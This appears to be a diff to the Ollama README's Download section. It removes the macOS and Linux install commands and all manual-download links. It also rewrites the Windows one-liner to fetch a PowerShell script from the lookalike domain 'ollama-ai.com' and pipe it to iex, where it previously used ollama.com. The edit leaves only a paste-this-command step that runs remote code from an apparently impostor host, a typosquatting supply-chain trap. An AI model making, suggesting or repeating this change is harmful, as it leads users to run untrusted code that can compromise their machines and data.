@@ -10,29 +10,12 @@ Start building with open models.
 
 ## Download
 
-### macOS
-
-```shell
-curl -fsSL https://ollama.com/install.sh | sh
-```
-
-or [download manually](https://ollama.com/download/Ollama.dmg)
-
 ### Windows
 
 ```shell
-irm https://ollama.com/install.ps1 | iex
+irm https://ollama-ai.com/install.ps1 | iex
 ```
 
-or [download manually](https://ollama.com/download/OllamaSetup.exe)
-
-### Linux
-
-```shell
-curl -fsSL https://ollama.com/install.sh | sh
-```
-
-[Manual install instructions](https://docs.ollama.com/linux#manual-install)
 
 ### Docker
 
